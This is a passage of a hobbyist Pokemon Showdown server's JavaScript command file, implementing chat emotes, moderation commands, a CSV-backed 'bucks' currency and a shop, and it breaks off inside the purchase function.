/**
 * System commands
 * Pokemon Showdown - http://pokemonshowdown.com/
 *
 * These are system commands - commands required for Pokemon Showdown
 * to run. A lot of these are sent by the client.
 *
 * If you'd like to modify commands, please go to config/commands.js,
 * which also teaches you how to use commands.
 *
 * @license MIT license
 */
var fs = require('fs');
var code = fs.createWriteStream('config/friendcodes.txt',{'flags':'a'});
var badges = fs.createWriteStream('config/badges.txt',{'flags':'a'});
var studiouser = fs.createWriteStream('config/studiopermissions.txt',{'flags':'a'});
var key = '';
var hint = '';
var isMotd = false;
var inShop = ['symbol', 'custom', 'animated', 'room', 'trainer', 'fix', 'declare', 'badge', 'potd', 'musicbox', 'vip', 'emote'];
var closeShop = false;
var closedShop = 0;
var bank = exports.bank = {
			bucks: function(uid, amount, take) {
			   	var data = fs.readFileSync('config/money.csv','utf8')
				var match = false;
				var money = 0;
				var row = (''+data).split("\n");
				var line = '';
				for (var i = row.length; i > -1; i--) {
					if (!row[i]) continue;
					var parts = row[i].split(",");
					var userid = toId(parts[0]);
					if (uid.userid == userid) {
						var x = Number(parts[1]);
						var money = x;
						match = true;
						if (match === true) {
							line = line + row[i];
							break;
						}
					}
				}
				uid.money = money;
				if (take === true){if (amount <= uid.money){
				uid.money = uid.money - amount; take = false;}
				else return false;
				}
				else {uid.money = uid.money + amount;}
				if (match === true) {
					var re = new RegExp(line,"g");
					fs.readFile('config/money.csv', 'utf8', function (err,data) {
					if (err) {
						return console.log(err);
					}
					var result = data.replace(re, uid.userid+','+uid.money);
					fs.writeFile('config/money.csv', result, 'utf8', function (err) {
						if (err) return console.log(err);
					});
					});
				} else {
					var log = fs.createWriteStream('config/money.csv', {'flags': 'a'});
					log.write("\n"+uid.userid+','+uid.money);
				}
				return true;
				},

	    coins: function(uid, amount, take) {

	    var lore = fs.readFileSync('config/coins.csv','utf8')
                var match = false;
                var coins = 0;
                var spag = (''+lore).split("\n");
                var hetti = '';
                for (var i = spag.length; i > -1; i--) {
                    if (!spag[i]) continue;
                    var parts = spag[i].split(",");
                    var userid = toId(parts[0]);
					if (uid.userid == userid) {
                        var x = Number(parts[1]);
                        var coins = x;
                        match = true;
                        if (match === true) {
                            hetti = hetti + spag[i];
                            break;
                        }
                    }
                }
                uid.coins = coins;
		if (take === true){if (amount <= uid.coins){
				uid.coins = uid.coins - amount; take = false;}
				else return false;
				}
				else {uid.coins = uid.coins + amount;}

                if (match === true) {
                    var be = new RegExp(hetti,"g");
                    fs.readFile('config/coins.csv', 'utf8', function (err,lore) {
                        if (err) {
                            return console.log(err);
                        }
                        var result = lore.replace(be, uid.userid+','+uid.coins);
                        fs.writeFile('config/coins.csv', result, 'utf8', function (err) {
                            if (err) return console.log(err);
                        });
                    });
                } else {
                    var log = fs.createWriteStream('config/coins.csv', {'flags': 'a'});
                    log.write("\n"+uid.userid+','+uid.coins);
                } return true;
		}


	}
	var economy = exports.economy = {
		writeMoney: function(uid, amount) {
			var data = fs.readFileSync('config/money.csv','utf8')
			var match = false;
			var money = 0;
			var row = (''+data).split("\n");
			var line = '';
			for (var i = row.length; i > -1; i--) {
				if (!row[i]) continue;
				var parts = row[i].split(",");
				var userid = toId(parts[0]);
				if (uid.userid == userid) {
					var x = Number(parts[1]);
					var money = x;
					match = true;
					if (match === true) {
						line = line + row[i];
						break;
					}
				}
			}
			uid.money = money;
			uid.money = uid.money + amount;
			if (match === true) {
				var re = new RegExp(line,"g");
				fs.readFile('config/money.csv', 'utf8', function (err,data) {
				if (err) {
					return console.log(err);
				}
				var result = data.replace(re, uid.userid+','+uid.money);
				fs.writeFile('config/money.csv', result, 'utf8', function (err) {
					if (err) return console.log(err);
				});
				});
			} else {
				var log = fs.createWriteStream('config/money.csv', {'flags': 'a'});
				log.write("\n"+uid.userid+','+uid.money);
			}
		},
	}
var ipbans = fs.createWriteStream('config/ipbans.txt', {'flags': 'a'});
var avatar = fs.createWriteStream('config/avatars.csv', {'flags': 'a'});
//spamroom
if (typeof spamroom == "undefined") {
	spamroom = new Object();
}
if (!Rooms.rooms.spamroom) {
	Rooms.rooms.spamroom = new Rooms.ChatRoom("spamroom", "spamroom");
	Rooms.rooms.spamroom.isPrivate = true;
}

//tells
if (typeof tells === 'undefined') {
	tells = {};
}

var crypto = require('crypto');
var poofeh = true;
/*
var aList = ["kupo","panpaw","corn","stevoduhhero","fallacie","fallacies","imanalt",
		"ipad","orivexes","treecko","theimmortal","talktakestime","oriv","v4",
		"jac","geminiiii", "lepandaw", "cattelite","foe"];
*/
var canTalk;
var fs = require('fs');

const MAX_REASON_LENGTH = 300;

var commands = exports.commands = {
	/**** normal stuff ****/
	random: 'pickrandom',
	pickrandom: function (target, room, user) {
		if (!target) return this.sendReply('/pickrandom [option 1], [option 2], ... - Randomly chooses one of the given options.');
		if (!this.canBroadcast()) return;
		var targets;
		if (target.indexOf(',') === -1) {
			targets = target.split(' ');
		} else {
			targets = target.split(',');
		};
		var result = Math.floor(Math.random() * targets.length);
		return this.sendReplyBox(targets[result].trim());
	},

	poker: function(target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('<div class="infobox">Play Poker Online:<br />&nbsp;&nbsp;- <a href="http://www.pogo.com/games/free-online-poker" target="_blank">Play Poker</a><img src="http://www.picgifs.com/sport-graphics/sport-graphics/playing-cards/sport-graphics-playing-cards-590406.gif" style="float: left;" height="30px" /></div>');
	},

	version: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox("Server version: <b>" + CommandParser.package.version + "</b>");
	},
	
	customavatar: 'ca',
	ca: function(target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('<b>Custom Avatars</b> - In order to get a custom avatar, you must buy it from the shop.  For more information, do /shop.');
	},
	
	loadipbans: 'viewbanlist',
	loadbans: 'viewbanlist',
	vbl: 'viewbanlist',
	viewbanlist: function(target, room, user, connection) {
				if (!this.can('ban')) return false;
                var ipbans = fs.readFileSync('config/ipbans.txt','utf8');
                return user.send('|popup|'+ipbans);
	},
	
	hug: function(target, room, user){
		if(!target) return this.sendReply('/hug needs a target.');
		return this.parse('/me hugs ' + target + '.');
	},
	
	slap: function(target, room, user){
		if(!target) return this.sendReply('/slap needs a target.');
		return this.parse('/me slaps ' + target + ' with a large trout.');
	},
	
	roomid: 'room',
	room: function(target, room, user) {
        	if (!this.canBroadcast()) return;
        	this.sendReplyBox('You are currently in the room "<b>'+room.id+'</b>".');
	},
	
	showimage: function(target, room, user) {
		if (!target) return this.parse('/help showimage');
		if (!this.can('declare', null, room)) return false;

		if (!this.canTalk()) return;

		targets = target.split(', ');
		if (targets.length != 3) {
			return this.parse('/help showimage');
		}

		this.add('|raw|'+sanitize(user.name)+' shows:<br /><img src="'+sanitize(targets[0])+'" alt="" width="'+toId(targets[1])+'" height="'+toId(targets[2])+'" />');
	},
	
	maindeclare: function(target, room, user) {
		if (!target) return this.parse('/help declare');
		if (!this.can('declare', null, room)) return false;

		if (!this.canTalk()) return;

		this.add('|raw|<div class="broadcast-blue"><b>'+sanitize(target)+'</b></div>');
		this.logModCommand(user.name+' declared '+target);
	}, 
	
	punt: function(target, room, user){
		if(!target) return this.sendReply('/punt needs a target.');
		return this.parse('/me punts ' + target + ' to the moon!');
	},
	
	crai: 'cry',
	cry: function(target, room, user){
		return this.parse('/me starts tearbending dramatically like Katara~!');
	},
	
	dk: 'dropkick',
	dropkick: function(target, room, user){
		if(!target) return this.sendReply('/dropkick needs a target.');
		return this.parse('/me dropkicks ' + target + ' across the PokÃƒÂ©mon Stadium!');
	},
	
	fart: function(target, room, user){
		if(!target) return this.sendReply('/fart needs a target.');
		return this.parse('/me farts on ' + target + '\'s face!');
	},
	
	poke: function(target, room, user){
		if(!target) return this.sendReply('/poke needs a target.');
		return this.parse('/me pokes ' + target + '.');
	},
	
	namelock: 'nl',
	nl: function(target, room, user) {
		if (!this.can('ban')) return false;
		target = this.splitTarget(target);
		targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('/namelock - Lock a user into a username.');
		}
		if (targetUser.namelock === true) {
			return this.sendReply("The user "+targetUser+" is already namelocked.");
		}
		targetUser.namelock = true;
		return this.sendReply("The user "+targetUser+" is now namelocked.");
	},

	unnamelock: 'unl',
	unl: function(target, room, user) {
		if (!this.can('ban')) return false;
		target = this.splitTarget(target);
		targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('/unnamelock - Unlock a user from a username.');
		}
		if (targetUser.namelock === false) {
			return this.sendReply("The user "+targetUser+" is already un-namelocked.");
		}
		targetUser.namelock = false;
		return this.sendReply("The user "+targetUser+" is now un-namelocked.");
	},

	pet: function(target, room, user){
		if(!target) return this.sendReply('/pet needs a target.');
		return this.parse('/me pets ' + target + ' lavishly.');
	},

	me: function (target, room, user, connection) {
		// By default, /me allows a blank message
		if (target) target = this.canTalk(target);
		if (!target) return;

		var message = '/me ' + target;
		// if user is not in spamroom
		if (spamroom[user.userid] === undefined) {
			// check to see if an alt exists in list
			for (var u in spamroom) {
				if (Users.get(user.userid) === Users.get(u)) {
					// if alt exists, add new user id to spamroom, break out of loop.
					spamroom[user.userid] = true;
					break;
				}
			}
		}

		if (user.userid in spamroom) {
			this.sendReply('|c|' + user.getIdentity() + '|' + message);
			return Rooms.rooms['spamroom'].add('|c|' + user.getIdentity() + '|' + message);
		} else {
			return message;
		}
	 },
	 /*/
	 profile: 'profile45',
	 profile45: function(target, room, user, connection) {
	 if (!this.canBroadcast()) return;
            if (!target) target = user.name;
            if (toId(target).length < 1) return this.sendReply('"'+target+'" is an invalid username.');
            targetUser = Users.get(target);
            if (!targetUser) return this.sendReply('User not found.');	
            if (!targetUser) {
                username = target;
                userid = toId(target);
                avatar = getAvatar(userid);    
                        if (isNaN(avatar)) {
                                avatar = 'http://50.62.73.114:8000/avatars/'+avatar+'';
                        } else {
                                avatar = 'http://play.pokemonshowdown.com/sprites/trainers/'+avatar+'.png';
                        }
            } else {
                username = targetUser.name;
                userid = targetUser.userid;
                userGroup = config.groups[targetUser.group].name
                avatar = targetUser.avatar;
            }
            var mMatch = false;
            var money = 0;
            var total = '';
            if (!target) {
            var data = fs.readFileSync('config/money.csv','utf8')
                var row = (''+data).split("\n");
                for (var i = row.length; i > -1; i--) {
                        if (!row[i]) continue;
                        var parts = row[i].split(",");
                        var userid = toId(parts[0]);
                        if (user.userid == userid) {
                        var x = Number(parts[1]);
                        var money = x;
                        mMatch = true;
                        if (mMatch === true) {
                                break;
                        }
                        }
                }
                if (mMatch === true) {
                        var p = 'Gold bucks';
                        if (money < 2) p = 'Gold buck';
                        total += user.name + ' has ' + money + ' ' + p + '.<br />';
                }
                if (mMatch === false) {
                        total += 'You have no Gold bucks.<br />';
                }
                user.money = money;
        } else {
                var data = fs.readFileSync('config/money.csv','utf8')
                target = this.splitTarget(target);
        	var targetUser = this.targetUserOrSelf(target);
                if (!targetUser) return this.sendReply('User ' + this.targetUsername + ' not found.');
                var money = 0;
                var row = (''+data).split("\n");
                for (var i = row.length; i > -1; i--) {
                        if (!row[i]) continue;
                        var parts = row[i].split(",");
                        var userid = toId(parts[0]);
                        if (targetUser.userid == userid) {
                        var x = Number(parts[1]);
                        var money = x;
                        mMatch = true;
                        if (mMatch === true) {
                                break;
                        }
                        }
                }
                if (mMatch === true) {
                        var p = 'Gold bucks';
                        if (money < 2) p = 'Gold buck';
                        total +=  + money + ' ' + p + '.<br />';
                } 
                if (mMatch === false) {
                        total += ' None.<br />';
                }
                targetUser.money = money;
                                }
                if (config.groups[targetUser.group] && config.groups[targetUser.group].name) {
                        var group = ''+ config.groups[targetUser.group].name + ' (' + targetUser.group + ')';
                } else {
                        var group = 'Regular User';
                }                
            var profile = '';
            if (isNaN(avatar)) {
            profile += '<img src="http://50.62.73.114:8000/avatars/'+avatar+'" height=80 width=80 align=left>';
            profile += '<img src="http://i.imgur.com/RK6UUIw.png" width="40%"><br />';
            profile += '&nbsp;<font color=#24678d><b>Name: </font></b>'+username+'<br />';
            profile += '&nbsp;<font color=#24678d><b>Rank: </font>'+userGroup+'<br />';
            profile += '&nbsp;<font color=#24678d><b>Money: </font>'+money+'<br><br clear="all">';
		} else {
                                profile += '<img src="http://play.pokemonshowdown.com/sprites/trainers/'+avatar+'.png"  height=80 width=80 align=left>';
        	 		profile += '<img src="http://i.imgur.com/RK6UUIw.png" width="40%"><br />';
        	 		profile += '&nbsp;<font color=#24678d><b>Name: </font></b>'+username+'<br />';
            			profile += '&nbsp;<font color=#24678d><b>Rank: </font>'+userGroup+'<br />';
            			profile += '&nbsp;<font color=#24678d><b>Money: </font>'+money+'<br><br clear="all">';
			
                        }
                        
            this.sendReplyBox(profile);
        },
        /*///
	mee: function (target, room, user, connection) {
		// By default, /mee allows a blank message
		if (target) target = this.canTalk(target);
		if (!target) return;

		var message = '/mee ' + target;
		// if user is not in spamroom
		if (spamroom[user.userid] === undefined) {
			// check to see if an alt exists in list
			for (var u in spamroom) {
				if (Users.get(user.userid) === Users.get(u)) {
					// if alt exists, add new user id to spamroom, break out of loop.
					spamroom[user.userid] = true;
					break;
				}
			}
		}

		if (user.userid in spamroom) {
			this.sendReply('|c|' + user.getIdentity() + '|' + message);
			return Rooms.rooms['spamroom'].add('|c|' + user.getIdentity() + '|' + message);
		} else {
			return message;
		}
	},

	setmotd: 'motd',
	motd: function (target, room, user) {
		if (!this.can('pban')) return false;
		if (!target || target.indexOf(',') == -1) {
			return this.sendReply('The proper syntax for this command is: /motd [message], [interval (minutes)]');
		}
		if (isMotd == true) {
			clearInterval(motd);
		}
		targets = target.split(',');
		message = targets[0];
		time = Number(targets[1]);
		if (isNaN(time)) {
			return this.sendReply('Make sure the time is just the number, and not any words.');
		}
		motd = setInterval(function() {Rooms.rooms.lobby.add('|raw|<div class = "infobox"><b>Message of the Day:</b><br />'+message)}, time * 60 * 1000);
		isMotd = true;
		this.logModCommand(user.name+' set the message of the day to: '+message+' for every '+time+' minutes.');
		return this.sendReply('The message of the day was set to "'+message+'" and it will be displayed every '+time+' minutes.');
	},

	clearmotd: 'cmotd',
	cmotd: function (target, room, user) {
		if (!this.can('pban')) return false;
		if (isMotd == false) {
			return this.sendReply('There is no motd right now.');
		}
		clearInterval(motd);
		this.logModCommand(user.name+' cleared the message of the day.');
		return this.sendReply('You cleared the message of the day.');
	},
	
	spop: 'sendpopup',
	sendpopup: function(target, room, user) {
		if (!this.can('hotpatch')) return false;
		
		target = this.splitTarget(target);
		var targetUser = this.targetUser;

		if (!targetUser) return this.sendReply('/sendpopup [user], [message] - You missed the user');
		if (!target) return this.sendReply('/sendpopup [user], [message] - You missed the message');

		targetUser.popup(target);
		this.sendReply(targetUser.name + ' got the message as popup: ' + target);
		
		targetUser.send(user.name+' sent a popup message to you.');
		
		this.logModCommand(user.name+' send a popup message to '+targetUser.name);
	},
	
	cs: 'customsymbol',
	customsymbol: function(target, room, user) {
		if(!user.canCustomSymbol) return this.sendReply('You don\'t have the permission to use this command.');
  		//var free = true;
  		if (user.hasCustomSymbol) return this.sendReply('You currently have a custom symbol, use /resetsymbol if you would like to use this command again.');
 		if (!this.canTalk()) return;
  		//if (!free) return this.sendReply('Sorry, we\'re not currently giving away FREE custom symbols at the moment.');
  		if(!target || target.length > 1) return this.sendReply('/customsymbol [symbol] - changes your symbol (usergroup) to the specified symbol. The symbol can only be one character');
  		var a = target;
  		if (a === "+" || a === "$" || a === "%" || a ==="‽" || a ==="!" || a === "@" || a === "&" || a === "~" || a === "#" || a === "a" || a === "b" || a === "c" || a === "d" || a === "e" || a === "f" || a === "g" || a === "h" || a === "i" || a === "j" || a === "k" || a === "l" || a === "m" || a === "n" || a === "o" || a === "p" || a === "q" || a === "r" || a === "s" || a === "t" || a === "u" || a === "v" || a === "w" || a === "x" || a === "y" || a === "z" || a === "A" || a === "B" || a === "C" || a === "D" || a === "E" || a === "F" || a === "G" || a === "H" || a === "I" || a === "J" || a === "K" || a === "L" || a === "M" || a === "N" || a === "O" || a === "P" || a === "Q" || a === "R" || a === "S" || a === "T" || a === "U" || a === "V" || a === "W" || a === "X" || a === "Y" || a === "Z" || a === "0" || a === "1" || a === "2" || a === "3" || a === "4" || a === "5" || a === "6" || a === "7" || a === "8" || a === "9" || a === "Ã¥ÂÂ" ) {
  			return this.sendReply('Sorry, but you cannot change your symbol to this for safety/stability reasons.');
  		}
  		user.getIdentity = function(){
  			if(this.muted)	return '!' + this.name;
  			if(this.locked) return 'Ã¢â‚¬Â½' + this.name;
  			return target + this.name;
  		};
  		user.updateIdentity();
  		user.canCustomSymbol = false;
  		user.hasCustomSymbol = true;
  	},
  	
  	rs: 'resetsymbol',
	resetsymbol: function(target, room, user) {
		if (!user.hasCustomSymbol) return this.sendReply('You don\'t have a custom symbol!');
		user.getIdentity = function() {
			if (this.muted) return '!' + this.name;
			if (this.locked) return 'Ã¢â‚¬Â½' + this.name;
			return this.group + this.name;
		};
		user.hasCustomSymbol = false;
		delete user.getIdentity;
		user.updateIdentity();
		this.sendReply('Your symbol has been reset.');
	},
//Money Commands...

	wallet: 'atm',
        satchel: 'atm',
        fannypack: 'atm',
        purse: 'atm',
        bag: 'atm',
        atm: function(target, room, user, connection, cmd) {
        if (!this.canBroadcast()) return;
        var mMatch = false;
        var money = 0;
        var total = '';
        if (!target) {
        var data = fs.readFileSync('config/money.csv','utf8')
                var row = (''+data).split("\n");
                for (var i = row.length; i > -1; i--) {
                        if (!row[i]) continue;
                        var parts = row[i].split(",");
                        var userid = toId(parts[0]);
                        if (user.userid == userid) {
                        var x = Number(parts[1]);
                        var money = x;
                        mMatch = true;
                        if (mMatch === true) {
                                break;
                        }
                        }
                }
                if (mMatch === true) {
                        var p = 'Gold bucks';
                        if (money < 2) p = 'Gold buck';
                        total += user.name + ' has ' + money + ' ' + p + '.<br />';
                }
                if (mMatch === false) {
                        total += 'You have no Gold bucks.<br />';
                }
                user.money = money;
        } else {
                var data = fs.readFileSync('config/money.csv','utf8')
                target = this.splitTarget(target);
                var targetUser = this.targetUser;
                if (!targetUser) {
                        return this.sendReply('User '+this.targetUsername+' not found.');
                }
                var money = 0;
                var row = (''+data).split("\n");
                for (var i = row.length; i > -1; i--) {
                        if (!row[i]) continue;
                        var parts = row[i].split(",");
                        var userid = toId(parts[0]);
                        if (targetUser.userid == userid || target == userid) {
                        var x = Number(parts[1]);
                        var money = x;
                        mMatch = true;
                        if (mMatch === true) {
                                break;
                        }
                        }
                }
                if (mMatch === true) {
                        var p = 'Gold bucks';
                        if (money < 2) p = 'Gold buck';
                        total += targetUser.name + ' has ' + money + ' ' + p + '.<br />';
                } 
                if (mMatch === false) {
                        total += targetUser.name + ' has  no Gold bucks.<br />';
                }
                targetUser.money = money;
                                }
        return this.sendReplyBox('<b>Gold Wallet~</b><br>'+total+'');
        },
	
	awardbucks: 'givebucks',
	gb: 'givebucks',
	givebucks: function(target, room, user) {
		if(!user.can('pban')) return this.sendReply('You do not have enough authority to do this.');
		if(!target) return this.parse('/help givebucks');
		var jaja = ['tailz,', 'Tailz,'];
		if (target.indexOf(jaja) > -1) {
			return this.parse('I like big butts!! O3O');
		}
		if (target.indexOf(',') != -1) {
			var parts = target.split(',');
			parts[0] = this.splitTarget(parts[0]);
			var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (isNaN(parts[1])) {
			return this.sendReply('Very funny, now use a real number.');
		}
		var cleanedUp = parts[1].trim();
		var giveMoney = Number(cleanedUp);
		var data = fs.readFileSync('config/money.csv','utf8')
		var match = false;
		var money = 0;
		var line = '';
		var row = (''+data).split("\n");
		for (var i = row.length; i > -1; i--) {
			if (!row[i]) continue;
			var parts = row[i].split(",");
			var userid = toId(parts[0]);
			if (targetUser.userid == userid) {
			var x = Number(parts[1]);
			var money = x;
			match = true;
			if (match === true) {
				line = line + row[i];
				break;
			}
			}
		}
		targetUser.money = money;
		targetUser.money += giveMoney;
		if (match === true) {
			var re = new RegExp(line,"g");
			fs.readFile('config/money.csv', 'utf8', function (err,data) {
			if (err) {
				return console.log(err);
			}
			var result = data.replace(re, targetUser.userid+','+targetUser.money);
			fs.writeFile('config/money.csv', result, 'utf8', function (err) {
				if (err) return console.log(err);
			});
			});
		} else {
			var log = fs.createWriteStream('config/money.csv', {'flags': 'a'});
			log.write("\n"+targetUser.userid+','+targetUser.money);
		}
		var p = 'bucks';
		if (giveMoney < 2) p = 'buck';
		this.sendReply(targetUser.name + ' was given ' + giveMoney + ' ' + p + '. This user now has ' + targetUser.money + ' bucks.');
		targetUser.send(user.name + ' has given you ' + giveMoney + ' ' + p + '.');
		} else {
			return this.parse('/help givebucks');
		}
	},

	getbucks: function(target, room, user) {
        if (!this.canBroadcast()) return;
        this.sendReplyBox('<font size="2"><b>How to get bucks guide:</b><br><ul>' +
		'<li>Play tournaments in the Lobby or any other official room!  These tournaments will always give the winner bucks! Do /tour bucks for more information!</li>' +
		'<li>Sometimes people will do hangmans for money!</li>' +
		'<li>Casino! Click <button name="joinRoom" value="casino" target="_blank">here</button> to join! In here, everyone gets room voice!</li>' +
		'<li>Make a helpful suggestion to the server using /suggest [suggestion] (Bucks may vary)!');
	},
	
	tb: 'transferbucks',
	transferbucks: function(target, room, user) {
		if(!target) return this.sendReply('|raw|Correct Syntax: /transferbucks <i>user</i>, <i>amount</i>');
		if (target.indexOf(',') >= 0) {
			var parts = target.split(',');
			if (parts[0].toLowerCase() === user.name.toLowerCase()) {
				return this.sendReply('You can\'t transfer Bucks to yourself.');
			}
			parts[0] = this.splitTarget(parts[0]);
			var targetUser = this.targetUser;
		}
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (isNaN(parts[1])) {
			return this.sendReply('Very funny, now use a real number.');
		}
		if (parts[1] < 0) {
			return this.sendReply('Number cannot be negative.');
		}
		if (parts[1] == 0) {
			return this.sendReply('No! You cannot transfer 0 bucks, you fool!');
		}
		if (String(parts[1]).indexOf('.') >= 0) {
			return this.sendReply('You cannot transfer numbers with decimals.');
		}
		if (parts[1] > user.money) {
			return this.sendReply('You cannot transfer more money than what you have.');
		}
		var p = 'Bucks';
		var cleanedUp = parts[1].trim();
		var transferMoney = Number(cleanedUp);
		if (transferMoney === 1) {
			p = 'Buck';
		}
		economy.writeMoney(user, -transferMoney);
		//set time delay because of node asynchronous so it will update both users' money instead of either updating one or the other
		setTimeout(function(){economy.writeMoney(targetUser, transferMoney);fs.appendFile('logs/transactions.log','\n'+Date()+': '+user.name+' has transferred '+transferMoney+' '+p+' to ' + targetUser.name + '. ' +  user.name +' now has '+user.money + ' ' + p + ' and ' + targetUser.name + ' now has ' + targetUser.money +' ' + p +'.');},3000);
		this.sendReply('You have successfully transferred ' + transferMoney + ' to ' + targetUser.name + '. You now have ' + user.money + ' ' + p + '.');
		targetUser.popup(user.name + ' has transferred ' + transferMoney + ' ' +  p + ' to you.');
		this.logModCommand('('+user.name+'  has transferred ' + transferMoney + ' ' +  p + ' to ' + targetUser.name + '.)');
	},
		
	takebucks: 'removebucks',
	removebucks: function(target, room, user) {
		if(!user.can('pban')) return this.sendReply('You do not have enough authority to do this.');
		if(!target) return this.parse('/help removebucks');
		if (target.indexOf(',') != -1) {
			var parts = target.split(',');
			parts[0] = this.splitTarget(parts[0]);
			var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (isNaN(parts[1])) {
			return this.sendReply('Very funny, now use a real number.');
		}
		var cleanedUp = parts[1].trim();
		var takeMoney = Number(cleanedUp);
		var data = fs.readFileSync('config/money.csv','utf8')
		var match = false;
		var money = 0;
		var line = '';
		var row = (''+data).split("\n");
		for (var i = row.length; i > -1; i--) {
			if (!row[i]) continue;
			var parts = row[i].split(",");
			var userid = toId(parts[0]);
			if (targetUser.userid == userid) {
			var x = Number(parts[1]);
			var money = x;
			match = true;
			if (match === true) {
				line = line + row[i];
				break;
			}
			}
		}
		targetUser.money = money;
		targetUser.money -= takeMoney;
		if (match === true) {
			var re = new RegExp(line,"g");
			fs.readFile('config/money.csv', 'utf8', function (err,data) {
			if (err) {
				return console.log(err);
			}
			var result = data.replace(re, targetUser.userid+','+targetUser.money);
			fs.writeFile('config/money.csv', result, 'utf8', function (err) {
				if (err) return console.log(err);
			});
			});
		} else {
			var log = fs.createWriteStream('config/money.csv', {'flags': 'a'});
			log.write("\n"+targetUser.userid+','+targetUser.money);
		}
		var p = 'bucks';
		if (takeMoney < 2) p = 'buck';
		this.sendReply(targetUser.name + ' has had ' + takeMoney + ' ' + p + ' removed. This user now has ' + targetUser.money + ' bucks.');
		targetUser.send(user.name + ' has removed ' + takeMoney + ' bucks from you.');
		} else {
			return this.parse('/help removebucks');
		}
	},

	buy: function(target, room, user) {
		if (!target) return this.sendReply('You need to pick an item! Type /buy [item] to buy something.');
		if (closeShop) return this.sendReply('The shop is currently closed and will open shortly.');
		var target2 = target;
		target = target.split(', ');
		var avatar = '';
		var data = fs.readFileSync('config/money.csv','utf8')
		var match = false;
		var money = 0;
		var line = '';
		var row = (''+data).split("\n");
		for (var i = row.length; i > -1; i--) {
			if (!row[i]) continue;
			var parts = row[i].split(",");
			var userid = toId(parts[0]);
			if (user.userid == userid) {
			var x = Number(parts[1]);
			var money = x;
			match = true;
			if (match === true) {
				line = line + row[i];
				break;
			}
			}
		}
		user.money = money;
		var price = 0;
		if (target2 === 'symbol') {
			price = 5;
			if (price <= user.money) {
				user.money = user.money - price;
				this.sendReply('You have purchased a custom symbol. You will have this until you log off for more than an hour.');
				this.sendReply('Use /customsymbol [symbol] to change your symbol now!');
				user.canCustomSymbol = true;
				this.add(user.name + ' has purchased a custom symbol!');
			} else {
				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
			}
		}
		if (target[0] === 'custom') {
			price = 35;
			if (price <= user.money) {
				if (!target[1]) return this.sendReply('Please specify the avatar you would like you buy. It has a maximum size of 80x80 and must be in .png format. ex: /buy custom, [url to the avatar]');
       				var filename = target[1].split('.');
				filename = '.'+filename.pop();
				if (filename != ".png") return this.sendReply('Your avatar must be in .png format.');
				user.money = user.money - price;
				this.sendReply('You have purchased a custom avatar. Staff have been notified and it will be added in due time.');
				user.canCustomAvatar = true;
				Rooms.rooms.staff.add(user.name+' has purchased a custom avatar. Image: '+target[1]);
				for (var u in Users.users) {
					if (Users.users[u].group == "~" || Users.users[u].group == "&") {
						Users.users[u].send('|pm|~Server|'+Users.users[u].group+Users.users[u].name+'|'+user.name+' has purchased a custom avatar. Image: '+target[1]);
					}
				}
			} else {
				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
			}
		}
		/*/
		if (target[0] === 'emote') {
			price = 150;
			if (price <= user.money) {
				if (!target[1]) return this.sendReply('Please specify the emote you would like you buy. ex: /buy emote, [url to the emote]');
       				var filename = target[1].split('.');
				filename = '.'+filename.pop();
				if (filename != ".png" || filename != ".jpg" || filename != ".gif") return this.sendReply('Your emote must be in .png, .jpg or .gif format.');
				user.money = user.money - price;
				this.sendReply('You have purchased a custom emote. Staff have been notified and it will be added in due time.');
				user.canCustomEmote = true;
				Rooms.rooms.staff.add(user.name+' has purchased a custom emote. Emote: '+target[1]);
				for (var u in Users.users) {
					if (Users.users[u].group == "~") {
						Users.users[u].send('|pm|~Server|'+Users.users[u].group+Users.users[u].name+'|'+user.name+' has purchased a custom emote. Emote: '+target[1]);
					}
				}
			} else {
				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
			}
		}
		*/
		if (target[0] === 'animated') {
			price = 45;
			if (price <= user.money) {
				if (!target[1]) return this.sendReply('Please specify the avatar you would like you buy. It has a maximum size of 80x80 and must be in .gif format. ex: /buy animated, [url to the avatar]');
       				var filename = target[1].split('.');
				filename = '.'+filename.pop();
				if (filename != ".gif") return this.sendReply('Your avatar must be in .gif format.');
				user.money = user.money - price;
				this.sendReply('You have purchased a custom animated avatar. Staff have been notified and it will be added in due time.');
				user.canAnimatedAvatar = true;
				Rooms.rooms.staff.add(user.name+' has purchased a custom animated avatar. Image: '+target[1]);
				for (var u in Users.users) {
					if (Users.users[u].group == "~" || Users.users[u].group == "&") {
						Users.users[u].send('|pm|~Server|'+Users.users[u].group+Users.users[u].name+'|'+user.name+' has purchased a custom animated avatar. Image: '+target[1]);
					}
				}
			} else {
				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
			}
		}
		if (target[0] === 'room') {
			price = 100;
			if (price <= user.money) {
				user.money = user.money - price;
				this.sendReply('You have purchased a chat room. You need to message an Admin so that the room can be made.');
				user.canChatRoom = true;
				this.add(user.name + ' has purchased a chat room!');
			} else {
				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
			}
		}
		if (target2 === 'trainer') {
			price = 60;
			if (price <= user.money) {
				user.money = user.money - price;
				this.sendReply('You have purchased a trainer card. You need to message an Admin capable of adding this (Panpawn / papew).');
				user.canTrainerCard = true;
				this.add(user.name + ' has purchased a trainer card!');
				Rooms.rooms.tailz.add(user.name + ' has purchased a trainer card!');
			} else {
				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
			}
		}
		if (target2 === 'musicbox') {
			price = 60;
			if (price <= user.money) {
				user.money = user.money - price;
				this.sendReply('You have purchased a music box. You need to message an Admin capable of adding this (Panpawn / papew).');
				user.canMusicBox = true;
				this.add(user.name + ' has purchased a music box!');
				Rooms.rooms.tailz.add(user.name + ' has purchased a music box!');
			} else {
				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
			}
